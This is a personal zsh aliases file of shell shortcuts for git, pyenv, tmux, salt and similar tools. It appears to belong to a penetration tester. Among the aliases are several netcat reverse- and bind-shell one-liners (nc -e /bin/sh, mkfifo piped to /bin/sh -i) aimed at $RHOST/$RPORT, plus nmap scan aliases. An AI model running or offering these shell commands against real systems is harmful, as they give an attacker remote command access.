#!/usr/bin/env zsh

# # Overridden commands ###
alias mkdir="mkdir -pv"
alias less="less -R"
alias ls="ls -hpG"
alias sudo="sudo "
alias wget="wget -c"
### Safer commands ###
alias mv="mv -i"
alias cp="cp -i"
alias ln="ln -i"
alias rm="rm -I"
### Enhanced commands ###
alias l.="ls -d .*"
alias la="ls -lAh"
alias ll="ls -lah"
alias ldir="ls -d */"
alias lt='du -sh * | sort -h'
alias cd..="cd .."
alias ..="cd .."
alias ...="cd ../../../"
alias ....="cd ../../../../"
alias .....="cd ../../../../"
alias .4="cd ../../../../"
alias .5="cd ../../../../.."
alias desk="cd ~/Desktop"
alias down="cd ~/Downloads"

### Shortcuts ###
alias ccd..="cd"
alias :q="exit"
alias bye="exit"
alias die="exit"
alias quit="exit"
alias ff="find . -type f -name"
alias fd="find . -type d -name"
alias h="history"
alias h1="history 10"
alias h2="history 20"
alias h3="history 30"
alias hgrep="history | grep"
alias hd='hexdump -C'
alias ipt='sudo /sbin/iptables'
alias j='jobs -l'
alias ckear="clear"
alias c="clear"
alias cl="clear"
alias clr="clear"
alias cls="clear"
alias get='git'
alias gti='git'
alias dircount="ls -1 | wc -l"
alias dc="dircount"
alias sha1="openssl sha1"
alias md5="openssl md5"
alias xml='xmllint --format -'
alias paux='ps aux | grep'
alias sai="sudo apt-get install"
alias sau="sudo apt-get update"
alias svi='sudo vim'
alias edit='vim'

### Useful Commands ###

### Pretty commands
alias vmount="mount |column -t"
alias vpath='echo -e ${PATH//:/\\n}'
alias echo-path='echo -e ${PATH//:/\\n}'
alias echo-mount="mount |column -t"

### Useless stuff ###
#alias lostterm='export PS1="\[\033[01;32m\]>: "'
alias busy="cat /dev/urandom | hexdump -C | grep 'ca fe'"

### Derived commands ### 
alias chmod-setgid="chmod g+s"
alias cpy="xclip -selection clipboard"
alias curl-follow="curl -O -J -L"
### Docker ###
#alias dl="sudo docker ps -l -q"
#alias dps="sudo docker ps"
#alias di="sudo docker images"
#alias dip="sudo docker inspect --format '{{ .NetworkSettings.IPAddress }}'"
#alias dkd="sudo docker run -d -P"
#alias dki="sudo docker run -i -t -P"
#alias dex="sudo docker exec -i -t"
#alias drmf="sudo docker stop $(sudo docker ps -a -q) && sudo docker rm $(sudo docker ps -a -q)"
alias du1="du -d1"
alias find-by-name-indir="find . -iname "
alias find-by-name-root="find / -iname "

### git ###
alias gs='git status'
alias gst="git status -sb"
alias clone='git clone'
alias merge='git merge'
alias pull='git pull'
alias push='git push'
alias amend='git commit --amend '
alias ga="git add"
alias gc="git commit -m"
#alias gaa="git add -A"
alias gc="git commit -m"
#alias gal="git add ."
#alias gall="git add ."
alias gc="git commit"
alias gca="git commit -a"
alias gcm="git commit -m"
alias gl="git log"
alias gfa='git fetch --all'
#alias gbls="git for-each-ref --format='%(committerdate) %09 %(authorname) %09 %(refname)' | sort -k5n -k2M -k3n -k4n"
#alias gkd='git ksdiff'
#alias glc='git log -p --follow -n 1'
alias git-init='git config user.email tbennett6421@gmail.com && git config user.name "Tyler Bennett" && git config core.editor vim && git config diff.tool vimdiff && git config difftool.prompt false'
alias git-revert-file="git checkout HEAD -- "
alias git-diff-head="git diff HEAD "
alias git-set-ssh="git remote set-url origin "
alias gcot="git checkout"
alias gchekout="git checkout"
alias gchckout="git checkout"
alias gpsh="git push -u origin"
alias grf="git checkout HEAD -- "
alias gstash="git stash"
alias gw="git whatchanged"
alias gitlg="git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
alias gcc-dev="gcc -g -Wall -Wextra -Winline"
alias grep_for_text="grep -inrI "
alias header='curl -I'
alias iptlist='sudo /sbin/iptables -L -n -v --line-numbers'
alias iptlistin='sudo /sbin/iptables -L INPUT -n -v --line-numbers'
alias iptlistout='sudo /sbin/iptables -L OUTPUT -n -v --line-numbers'
alias iptlistfw='sudo /sbin/iptables -L FORWARD -n -v --line-numbers'
alias ls-size="ll -lAS && echo '-------------Smallest-----'"
alias ls-time="ls -lAt && echo '-------------Oldest-----'"
alias nc-trad-rev='nc -e /bin/sh $RHOST $RPORT'
alias nc-trad-bind='nc -e /bin/sh -l $LPORT'
alias nc-trad-rev='nc -e /bin/bash $RHOST $RPORT'
alias nc-trad-rev='nc -e /bin/bash -l $LPORT'
alias nc-sh-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $RHOST $RPORT >/tmp/f'
alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l $LPORT >/tmp/f'
alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $RHOST $RPORT >/tmp/f'
alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l $LPORT >/tmp/f'
alias rsync-copy="rsync -avhP"
alias wget-mirror-page="wget -p -k"

### User Definitions ###
### 7zip ###
alias 7z-extracthere="7z e "
alias 7z-unarchive="7z x "
alias 7z-cmax="7z a -t7z -m0=lzma -mx=9 "
alias 7z-cextreme="7z a -t7z -m0=lzma -mx=9 -md=32m -ms=on "
alias beep='echo -e "\a\c"'
alias beep-lots='while :; do beep; sleep 1; done'
### brew ### 
alias brewa="arch -arm64 brew "
alias brewai="arch -arm64 brew install"
alias brewarm="arch -arm64 brew "
alias brewarmi="arch -arm64 brew install"
alias brewls="brew list"
alias br="source ~/.bashrc"
alias zr="source ~/.zshrc"
### cd ### 
alias cdzcustom="cd ~/.oh-my-zsh/custom/"
alias hd_health='find /dev -regex "/dev/sd." -exec smartctl -l selftest {} \;'
alias headtail5="sed -ne'1,4{p;b};5{x;s/$/.../;x;G;p;b};:a;$p;N;11,$D;ba'"
alias headtail10="sed -ne'1,9{p;b};10{x;s/$/.../;x;G;p;b};:a;$p;N;21,$D;ba'"
alias fixcut='tr -s " "'
alias most="du -hsx * | sort -rh | head -10"
alias now='date +"%T"'
alias nowtime="now"
alias nowdate='date +"%d-%m-%Y"'
### nmap ###
alias nmap-quick='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -F -oA $RHOST"_nmap_quick"'
alias nmap-full='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -p- -O -oA $RHOST"_nmap_full"'
alias nmap-udp='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sU --top-ports 20 -O -oA $RHOST"_nmap_udp"'
alias serve2="python -m SimpleHTTPServer"
alias serve3="python3 -m http.server"
### pip ###
alias pipr="pip install -r requirements.txt"
### pyenv ###
alias pyg="pyenv global"
alias pyi27="pyenv install 2.7.18"
alias pyi36="pyenv install 3.6.15"
alias pyi38="pyenv install 3.8.13"
alias pyi-list="pyenv install -l"
alias pyi-search="pyenv install -l | grep"
alias pyl="pyenv local"
alias pyu="pyenv uninstall "
alias pyver="pyenv version"
alias pyvers="pyenv versions"
alias py-virt-new="pyenv virtualenv "
alias py-virt-ls="pyenv virtualenvs"
alias pywhich="pyenv which"
alias pyw="pyenv which"
### salt ###
alias salt-alive="salt '*' test.ping"
alias salt-applystate="salt '*' state.apply"
alias salt-targetwindows="salt -C 'G@os:Windows' "
alias salt-slowly="salt -b 1 --batch-wait 60 "
alias salt-crawl="salt -b 1 --batch-wait 360 "
### ssh ###
alias fingerprint='ssh-keygen -lf'
alias newkey='ssh-keygen -y -f'
alias sshcpi='ssh-copy-id'
alias cpkey='pbcopy < ~/.ssh/id_rsa.pub'
### screen ###
alias screen-attach="screen -Rd"
alias screen-list="screen -ls"
alias screen-new="screen -S "
alias sa="screen-attach"
alias sl="screen-list"
alias sn="screen-new"
### tmux ###
#alias ta="tmux attach -t "             #Attach new tmux session to already running named session
#alias tad="tmux attach -d -t "         #Detach named tmux session
alias ta="tmux-reattach "
alias tad="tmux-reattach "
alias tl="tmux list-sessions"          #Displays a list of running tmux sessions
alias tksv="tmux kill-server"          #Terminate all running tmux sessions
alias tkss="tmux kill-session -t "     #Terminate named running tmux session
alias tmux-reattach="tmux-reattach-session"
alias tmuxconf="$EDITOR $ZSH_TMUX_CONFIG"  #Open .tmux.conf file with an editor
alias tmuxreload="tmux source-file $ZSH_TMUX_CONFIG"
#alias sort_dir_by_size="du -ha --max-depth=1 | sort -h"
alias trim='awk '\''{$1=$1};1'\'''
alias du-usage='du -ch | grep total'
### usage ###
alias usage-ansible-usage="echo ansible -u<user> -i<inventory> -C<dry-run> -k<ask-ssh> -K<ask-become> -m<module> -a<module-args>"
alias usage-ansible-playbook-usage="echo ansible-playbook -u<user> -i<inventory> -C<dry-run> -k<ask-ssh> -K<ask-become> --step<pause-between-tasks> playbook.yml"
### venv ###
alias ve="python -m venv ./env"
alias va="source ./env/bin/activate"
alias vde="deactivate"
### vscode ###
alias vsc="code ."                  # Open the current folder in VS code
alias vsca="code --add "            # Add folder(s) to the last active window
alias vscd="code --diff"            # Compare two files with each other.
alias vscg="code --goto"            # Open a filespec file:line[:char]
alias vscn="code --new-window"      # Force to open a new window.
alias vscr="code --reuse-windows"   # Force to open a file or folder in the last active window.
alias webify="mogrify -resize 690\> *.png"
alias whatismyip="curl icanhazip.com"

### Conditional Aliases ###
if command -v lsb_release &> /dev/null
then
    if [[ $(lsb_release -i) == *Kali* ]]
    then
        alias nautilus="thunar"
    fi
fi

